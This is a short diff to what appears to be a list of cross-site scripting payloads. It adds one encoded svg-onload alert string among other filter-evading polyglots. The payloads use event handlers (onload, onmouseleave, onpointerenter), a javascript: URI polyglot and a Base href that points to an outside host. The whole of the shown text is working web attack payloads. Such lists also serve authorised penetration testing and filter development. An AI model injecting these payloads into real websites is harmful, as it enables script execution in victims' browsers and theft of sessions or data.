@@ -195,6 +195,7 @@
   JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
   "><svg onload=prompt%26%230000000040document.domain)>
   "><svg onload=prompt&#0000000040document.domain)>
+  "><svg onload=alert%26%230000000040"1")>
   "><svg onload=prompt%26%23x000000028;document.domain)>
   XSS"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
   XSS"><html><select %00 onControl onpointerenter=prompt(domain) hello>
